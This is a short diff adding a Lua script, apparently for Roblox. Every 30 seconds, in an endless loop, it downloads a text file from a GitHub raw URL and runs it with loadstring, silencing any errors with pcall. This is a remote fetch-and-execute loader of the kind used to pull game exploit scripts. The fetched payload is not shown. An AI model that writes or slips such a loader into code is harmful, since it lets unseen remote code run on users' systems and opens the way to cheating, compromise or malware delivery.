@@ -1,0 +1,9 @@
+while true do
+    task.wait(30)
+
+    pcall(function()
+        loadstring(game:HttpGet(
+            "https://raw.githubusercontent.com/minh-scripter/doors_void/refs/heads/main/Red_Maw.txt"
+        ))()
+    end)
+end
